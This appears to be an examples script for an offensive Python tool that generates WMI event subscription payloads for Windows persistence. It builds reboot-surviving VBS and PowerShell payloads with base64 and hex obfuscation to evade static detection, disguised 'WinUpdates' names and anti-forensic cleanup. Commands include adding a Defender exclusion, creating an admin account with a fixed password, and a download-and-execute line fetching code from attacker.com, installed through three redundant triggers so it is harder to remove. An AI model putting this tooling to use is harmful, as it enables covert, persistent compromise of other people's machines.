#!/usr/bin/env python3
"""
WMI Event Subscription Examples
Comprehensive examples of event-driven asynchronous command execution
"""

from wmi_event_subscription import (
    create_event_subscription, generate_event_subscription_payload,
    EventSubscriptionConfig, EventTriggerType, WMIEventSubscription
)


def example_1_basic_process_subscription():
    """Example 1: Basic process startup event subscription"""
    print("\n" + "="*80)
    print("EXAMPLE 1: Basic Process Startup Event Subscription")
    print("="*80)

    subscription = create_event_subscription()
    command = "cmd.exe /c whoami > C:\\temp\\output.txt"
    payload = subscription.generate_event_subscription_vbs(command)

    print("\nDescription:")
    print("  Executes command when ANY process starts")
    print(f"\nCommand: {command}")
    print("\nGenerated VBS Payload:")
    print(payload)
    print("\nNotes:")
    print("  - Permanent subscription (survives reboot)")
    print("  - Triggers on process creation events")
    print("  - Runs asynchronously without blocking")


def example_2_service_startup_subscription():
    """Example 2: Service startup event subscription"""
    print("\n" + "="*80)
    print("EXAMPLE 2: Service Startup Event Subscription")
    print("="*80)

    subscription = create_event_subscription()
    command = "powershell -NoProfile -Command 'Add-MpPreference -ExclusionPath C:\\\\temp'"
    payload = subscription.generate_service_startup_consumer(command, "RemoteRegistry")

    print("\nDescription:")
    print("  Executes command when RemoteRegistry service starts")
    print(f"\nService: RemoteRegistry")
    print(f"Command: {command}")
    print("\nGenerated VBS Payload:")
    print(payload)
    print("\nNotes:")
    print("  - Triggers specifically on service startup")
    print("  - Can be used for privilege escalation checks")
    print("  - Persists across system reboots")


def example_3_timer_event_subscription():
    """Example 3: Timer-based periodic execution"""
    print("\n" + "="*80)
    print("EXAMPLE 3: Timer-based Event Subscription (60 seconds)")
    print("="*80)

    subscription = create_event_subscription()
    command = "cmd.exe /c timeout /t 1"
    payload = subscription.generate_timer_event_consumer(command, 60000)

    print("\nDescription:")
    print("  Executes command every 60 seconds")
    print(f"\nInterval: 60000 milliseconds (60 seconds)")
    print(f"Command: {command}")
    print("\nGenerated VBS Payload:")
    print(payload)
    print("\nNotes:")
    print("  - Periodic execution via timer events")
    print("  - Accurate timing independent of polling")
    print("  - Very stealthy (no obvious loop structures)")


def example_4_async_event_handler():
    """Example 4: Asynchronous event handler class"""
    print("\n" + "="*80)
    print("EXAMPLE 4: Asynchronous Event Handler Class")
    print("="*80)

    subscription = create_event_subscription()
    command = "calc.exe"
    payload = subscription.generate_async_event_handler(command)

    print("\nDescription:")
    print("  VBS class-based async event handler")
    print(f"\nCommand: {command}")
    print("\nGenerated VBS Payload:")
    print(payload)
    print("\nNotes:")
    print("  - Non-blocking asynchronous execution")
    print("  - Class-based handler implementation")
    print("  - Can handle multiple events concurrently")


def example_5_process_specific_trigger():
    """Example 5: Execute on specific process startup"""
    print("\n" + "="*80)
    print("EXAMPLE 5: Specific Process Trigger Subscription")
    print("="*80)

    subscription = create_event_subscription()
    command = "cmd.exe /c echo Process started >> C:\\temp\\log.txt"
    process_name = "notepad.exe"
    payload = subscription.generate_event_trigger_subscription(command, process_name)

    print("\nDescription:")
    print("  Executes command when specific process starts")
    print(f"\nProcess: {process_name}")
    print(f"Command: {command}")
    print("\nGenerated VBS Payload:")
    print(payload)
    print("\nNotes:")
    print("  - Triggers only on specific process startup")
    print("  - Can be used for application launch hooks")
    print("  - Useful for maintaining persistence on app startup")


def example_6_encoded_base64_subscription():
    """Example 6: Base64-encoded event subscription"""
    print("\n" + "="*80)
    print("EXAMPLE 6: Base64-Encoded Event Subscription")
    print("="*80)

    subscription = create_event_subscription()
    command = "powershell -NoProfile -WindowStyle Hidden -Command whoami"
    payload = subscription.generate_encoded_event_subscription(command, encoding="base64")

    print("\nDescription:")
    print("  Event subscription with Base64-encoded command")
    print(f"\nCommand: {command}")
    print("\nGenerated VBS Payload:")
    print(payload)
    print("\nNotes:")
    print("  - Command is Base64 encoded for obfuscation")
    print("  - Decoded at runtime by inline decoder")
    print("  - Hides actual command from static analysis")


def example_7_encoded_hex_subscription():
    """Example 7: Hex-encoded event subscription"""
    print("\n" + "="*80)
    print("EXAMPLE 7: Hex-Encoded Event Subscription")
    print("="*80)

    subscription = create_event_subscription()
    command = "cmd.exe /c systeminfo"
    payload = subscription.generate_encoded_event_subscription(command, encoding="hex")

    print("\nDescription:")
    print("  Event subscription with Hex-encoded command")
    print(f"\nCommand: {command}")
    print("\nGenerated VBS Payload:")
    print(payload)
    print("\nNotes:")
    print("  - Command is Hex encoded for obfuscation")
    print("  - Alternative to Base64 encoding")
    print("  - More resistant to string-based detection")


def example_8_powershell_event_subscription():
    """Example 8: PowerShell-based event subscription"""
    print("\n" + "="*80)
    print("EXAMPLE 8: PowerShell Event Subscription")
    print("="*80)

    subscription = create_event_subscription()
    command = "powershell -NoProfile -Command 'Get-Process | Out-File C:\\\\temp\\\\procs.txt'"
    payload = subscription.generate_powershell_event_subscription(command)

    print("\nDescription:")
    print("  Event subscription implemented in PowerShell")
    print(f"\nCommand: {command}")
    print("\nGenerated PowerShell Payload:")
    print(payload)
    print("\nNotes:")
    print("  - Alternative to VBS implementation")
    print("  - Better integration with PowerShell environment")
    print("  - Can leverage PowerShell cmdlets in handler")


def example_9_subscription_cleanup():
    """Example 9: Event subscription cleanup and removal"""
    print("\n" + "="*80)
    print("EXAMPLE 9: Event Subscription Removal (Cleanup)")
    print("="*80)

    subscription = create_event_subscription()
    payload = subscription.generate_event_subscription_removal()

    print("\nDescription:")
    print("  Remove WMI event subscriptions and cleanup")
    print("\nGenerated VBS Payload:")
    print(payload)
    print("\nNotes:")
    print("  - Removes event filters")
    print("  - Removes command line consumers")
    print("  - Removes filter-consumer bindings")
    print("  - Performs forensic cleanup")


def example_10_custom_configuration():
    """Example 10: Custom event subscription configuration"""
    print("\n" + "="*80)
    print("EXAMPLE 10: Custom Event Subscription Configuration")
    print("="*80)

    config = EventSubscriptionConfig(
        event_trigger=EventTriggerType.SERVICE_START,
        event_filter_name="WinUpdatesFilter",
        consumer_name="WinUpdatesConsumer",
        obfuscate_names=True,
        add_anti_forensics=True
    )

    subscription = WMIEventSubscription(config)
    command = "cmd.exe /c net user admin Password123 /add"
    payload = subscription.generate_service_startup_consumer(command, "wuauserv")

    print("\nConfiguration:")
    print(f"  Trigger: {config.event_trigger.value}")
    print(f"  Filter Name: {config.event_filter_name}")
    print(f"  Consumer Name: {config.consumer_name}")
    print(f"  Obfuscate Names: {config.obfuscate_names}")
    print(f"  Anti-Forensics: {config.add_anti_forensics}")
    print("\nGenerated VBS Payload:")
    print(payload)


def example_11_multiple_event_types():
    """Example 11: Generate payloads for all event types"""
    print("\n" + "="*80)
    print("EXAMPLE 11: All Event Subscription Types Comparison")
    print("="*80)

    command = "cmd.exe /c date /t"
    print(f"\nCommand: {command}\n")

    event_types = [
        ("process", "Process Startup"),
        ("service", "Service Startup"),
        ("timer", "Timer Event"),
        ("trigger", "Specific Process Trigger"),
        ("encoded", "Encoded Subscription"),
        ("async", "Async Handler"),
    ]

    for event_type, description in event_types:
        payload = generate_event_subscription_payload(command, event_type)
        lines = payload.count('\n') + 1
        print(f"[{event_type:10}] {description:25} - {len(payload):5} chars, {lines:2} lines")


def example_12_event_trigger_summary():
    """Example 12: Event trigger types overview"""
    print("\n" + "="*80)
    print("EXAMPLE 12: Available Event Trigger Types")
    print("="*80)

    subscription = create_event_subscription()

    print("\nAvailable WMI Event Triggers:\n")

    trigger_types = [
        (EventTriggerType.PROCESS_START, "Process creation"),
        (EventTriggerType.PROCESS_STOP, "Process termination"),
        (EventTriggerType.SERVICE_START, "Service startup"),
        (EventTriggerType.SERVICE_STOP, "Service shutdown"),
        (EventTriggerType.NETWORK_ADAPTER_CONFIG, "Network config change"),
        (EventTriggerType.DISK_SPACE_LOW, "Low disk space"),
        (EventTriggerType.SYSTEM_TIME_CHANGE, "System time change"),
        (EventTriggerType.USER_LOGIN, "User login"),
        (EventTriggerType.USER_LOGOUT, "User logout"),
        (EventTriggerType.REGISTRY_CHANGE, "Registry modification"),
        (EventTriggerType.FILE_CHANGE, "File change"),
        (EventTriggerType.WMI_CONSUMER_TIMER, "Timer event"),
    ]

    for trigger_type, description in trigger_types:
        wql = subscription.generate_event_filter_wql(trigger_type)
        print(f"[{trigger_type.value:25}] {description}")
        print(f"  WQL: {wql[:70]}...")
        print()


def example_13_persistence_mechanisms():
    """Example 13: Event subscriptions as persistence mechanisms"""
    print("\n" + "="*80)
    print("EXAMPLE 13: Event Subscriptions as Persistence Mechanisms")
    print("="*80)

    print("\nPersistence via WMI Event Subscriptions:\n")

    persistence_methods = [
        ("Process Startup", "Triggers on ANY process creation", "Very frequent"),
        ("Service Startup", "Triggers on specific service startup", "Once per service start"),
        ("Timer Events", "Periodic execution via timer", "Regular intervals"),
        ("User Login", "Triggers on user session creation", "Per login"),
        ("System Events", "Triggers on system-level events", "Varies by event"),
    ]

    for method, description, frequency in persistence_methods:
        print(f"[{method:20}]")
        print(f"  Description: {description}")
        print(f"  Frequency: {frequency}")
        print()

    print("Advantages of WMI Event Subscriptions:")
    print("  - Survive system reboot (stored in WMI repository)")
    print("  - No filesystem artifacts (runs from WMI namespace)")
    print("  - Asynchronous execution (no blocking)")
    print("  - Low profile (legitimate WMI usage)")
    print("  - Can monitor for legitimate system events")


def example_14_handler_summary():
    """Example 14: Event handler types summary"""
    print("\n" + "="*80)
    print("EXAMPLE 14: Event Handler Summary")
    print("="*80)

    subscription = create_event_subscription()
    handlers = subscription.generate_event_handler_summary()

    print("\nAvailable Event Handler Types:\n")

    for handler_key, handler_info in handlers.items():
        print(f"[{handler_key}]")
        print(f"  Name: {handler_info['name']}")
        print(f"  Description: {handler_info['description']}")
        print(f"  Trigger: {handler_info['trigger']}")
        print(f"  Persistence: {handler_info['persistence']}")
        print()


def example_15_high_level_api():
    """Example 15: High-level API usage"""
    print("\n" + "="*80)
    print("EXAMPLE 15: High-Level API Usage")
    print("="*80)

    command = "powershell.exe"
    print(f"\nCommand: {command}\n")

    # Process event
    print("[1] Process Event Subscription:")
    payload = generate_event_subscription_payload(command, "process")
    print(f"    Payload length: {len(payload)} chars")

    # Service event
    print("\n[2] Service Startup Subscription:")
    payload = generate_event_subscription_payload(command, "service", service_name="WinRM")
    print(f"    Payload length: {len(payload)} chars")

    # Timer event
    print("\n[3] Timer Event Subscription (30 seconds):")
    payload = generate_event_subscription_payload(command, "timer", interval=30000)
    print(f"    Payload length: {len(payload)} chars")

    # Encoded
    print("\n[4] Encoded Subscription (Base64):")
    payload = generate_event_subscription_payload(command, "encoded", encoding="base64")
    print(f"    Payload length: {len(payload)} chars")

    # Encoded Hex
    print("\n[5] Encoded Subscription (Hex):")
    payload = generate_event_subscription_payload(command, "encoded", encoding="hex")
    print(f"    Payload length: {len(payload)} chars")


def example_16_combined_persistence():
    """Example 16: Multiple persistence mechanisms combined"""
    print("\n" + "="*80)
    print("EXAMPLE 16: Combined Persistence Mechanisms")
    print("="*80)

    print("\nUsing multiple event subscriptions for resilient persistence:\n")

    subscription = create_event_subscription()
    command = "powershell -NoProfile -Command 'IEX(New-Object Net.WebClient).DownloadString(\"http://attacker.com/ps\")'"

    print("[1] Primary Mechanism - Service Startup:")
    payload1 = subscription.generate_service_startup_consumer(command)
    print(f"    Generated: {len(payload1)} chars")

    print("\n[2] Backup Mechanism - Timer Event (5 minutes):")
    payload2 = subscription.generate_timer_event_consumer(command, 300000)
    print(f"    Generated: {len(payload2)} chars")

    print("\n[3] Failsafe Mechanism - Process Startup:")
    payload3 = subscription.generate_event_subscription_vbs(command)
    print(f"    Generated: {len(payload3)} chars")

    print("\nBenefits of Multi-mechanism Approach:")
    print("  - Multiple trigger points for reliability")
    print("  - If one mechanism is disabled, others remain active")
    print("  - Different execution frequencies")
    print("  - Harder to detect and remove all at once")


def run_all_examples():
    """Run all examples"""
    examples = [
        example_1_basic_process_subscription,
        example_2_service_startup_subscription,
        example_3_timer_event_subscription,
        example_4_async_event_handler,
        example_5_process_specific_trigger,
        example_6_encoded_base64_subscription,
        example_7_encoded_hex_subscription,
        example_8_powershell_event_subscription,
        example_9_subscription_cleanup,
        example_10_custom_configuration,
        example_11_multiple_event_types,
        example_12_event_trigger_summary,
        example_13_persistence_mechanisms,
        example_14_handler_summary,
        example_15_high_level_api,
        example_16_combined_persistence,
    ]

    for example_func in examples:
        try:
            example_func()
        except Exception as e:
            print(f"\nError in {example_func.__name__}: {e}")

    print("\n" + "="*80)
    print("All examples completed!")
    print("="*80)


if __name__ == "__main__":
    import sys

    if len(sys.argv) > 1:
        example_num = int(sys.argv[1])
        examples = [
            example_1_basic_process_subscription,
            example_2_service_startup_subscription,
            example_3_timer_event_subscription,
            example_4_async_event_handler,
            example_5_process_specific_trigger,
            example_6_encoded_base64_subscription,
            example_7_encoded_hex_subscription,
            example_8_powershell_event_subscription,
            example_9_subscription_cleanup,
            example_10_custom_configuration,
            example_11_multiple_event_types,
            example_12_event_trigger_summary,
            example_13_persistence_mechanisms,
            example_14_handler_summary,
            example_15_high_level_api,
            example_16_combined_persistence,
        ]
        if 1 <= example_num <= len(examples):
            examples[example_num - 1]()
        else:
            print(f"Example {example_num} not found. Choose 1-{len(examples)}")
    else:
        run_all_examples()
